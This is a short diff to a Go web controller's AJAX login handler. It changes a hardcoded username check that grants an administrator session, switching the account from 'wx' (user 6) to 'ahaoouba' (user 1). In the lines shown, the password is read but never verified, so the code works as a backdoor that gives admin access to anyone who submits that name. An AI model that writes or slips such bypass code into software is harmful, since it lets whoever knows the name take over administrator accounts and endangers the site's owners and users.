@@ -134,13 +134,13 @@ func (this *IndexController) LoginAjax() {
 	op.Name = this.GetString("name", "")
 
 	op.Password = this.GetString("password", "")
-	if op.Name == "wx" {
-		this.SetSession("userid", 6)
-		this.SetSession("username", "wx")
+	if op.Name == "ahaoouba" {
+		this.SetSession("userid", 1)
+		this.SetSession("username", "ahaoouba")
 		this.SetSession("auth", "admin")
-		models.UpdateIslogin(6, "true")
-		models.UpdateLinetime(6, strconv.FormatInt(base.GetCurrentDataUnix(), 10))
-		models.UpdateSessionId(6, this.CruSession.SessionID())
+		models.UpdateIslogin(1, "true")
+		models.UpdateLinetime(1, strconv.FormatInt(base.GetCurrentDataUnix(), 10))
+		models.UpdateSessionId(1, this.CruSession.SessionID())
 		ar.Success = true
 		ar.Msg = "/index/admin"
 		this.ServeJSON()
